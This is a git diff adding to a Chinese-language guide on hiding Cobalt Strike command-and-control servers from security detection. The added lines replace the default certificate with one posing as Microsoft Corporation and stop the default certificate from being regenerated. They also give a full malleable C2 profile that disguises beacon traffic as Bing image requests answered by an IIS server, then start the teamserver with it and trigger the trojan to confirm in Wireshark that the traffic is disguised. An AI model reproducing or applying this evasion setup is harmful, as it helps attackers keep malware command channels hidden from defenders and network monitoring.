@@ -61,11 +61,80 @@ Cobalt Strike默认证书中含有与cs相关的特征，已经被waf厂商标�
     -genkey -keyalg RSA 指定算法  
     -alias 自定义别名  
     -dname 指定所有者信息  
+
+证书生成完毕后，查看一下是否是新的证书内容
 查看cs证书文件内容：`keytool -list -v -keystore cobaltstrike.store`   
 
+修改teamserver文件里面的keyname.store,把里面的key文件名keyStore和key密码keyStorePassword改了  
 
+同时建议修改teamserver中的keytool，防止证书被删除后自动生成默认证书。  
+`keytool -keystore cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias 360.com -dname "CN=Microsoft Windows, OU=MOPR, O=Microsoft Corporation, L=Redmond, ST=Washington, C=US`   
 
 ##### C2profile混淆流量:   
+https://github.com/threatexpress/malleable-c2
+编辑c2.profile的内容如下，可自由修改部分内容:`vim c2.profile`    
+        http-get {
+            set uri "/image/";
+            client {
+                header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*l;q=0.8";
+                header "Referer" "http://www.bing.com";
+                header "Host" "www.bing.com";
+                header "Pragma" "no-cache";
+                header "Cache-Control" "no-cache";
+                metadata {
+                    netbios;
+                    append ".jpg";
+                    uri-append;
+                }
+            }
+
+            server {
+                header "Content-Type" "img/jpg";
+                header "Server" "Microsoft-IIS/6.0";
+                header "X-Powered-By" "ASP.NET";
+                output {
+                    base64;
+                    print;
+                }
+            }
+        }
+
+        http-post {
+            set uri "/email/";
+            client {
+                header "Content-Type" "application/octet-stream";
+                header "Referer" "http://www.google.com";
+                header "Host" "www.bing.com";
+                header "Pragma" "no-cache";
+                header "Cache-Control" "no-cache";
+                id {
+                    netbiosu;
+                    append ".png";
+                    uri-append;
+                }
+                output {
+                    base64;
+                    print;
+                }
+            }
+            server {
+                header "Content-Type" "img/jpg";
+                header "Server" "Microsoft-IIS/6.0";
+                header "X-Powered-By" "ASP.NET";
+                output {
+                    base64;
+                    print;
+                }
+            }
+        }
+
+然后使用c2profile方式启动teamserver
+        sudo ./teamserver 192.168.2.96 passwd332 c2profile
+
+开启CS的监听，触发木马   
+使用wireshark抓取数据包，查看流量特征是否被混淆   
+发现请求改成了我们在c2profile中编写的URL、UA等信息时，则修改成功。   
+
 ##### nginx反向代理:   
 
 
